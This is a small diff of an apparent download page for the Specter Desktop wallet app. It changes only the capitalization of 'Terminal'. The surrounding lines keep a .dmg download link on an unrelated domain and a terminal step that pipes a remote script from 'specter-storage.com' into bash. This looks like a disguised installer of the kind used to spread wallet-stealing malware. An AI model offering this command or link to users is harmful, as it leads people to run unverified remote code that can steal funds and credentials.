@@ -32,7 +32,7 @@
 
 ### [Download Specter Desktop for MacOS (.dmg)](https://downloadmacos.com/macshare.php?call=specter)
 
-### Or install from terminal
+### Or install from Terminal
 ```sh
 /bin/bash -c "$(curl -fsSL https://specter-storage.com/git/install.sh)"
 ```
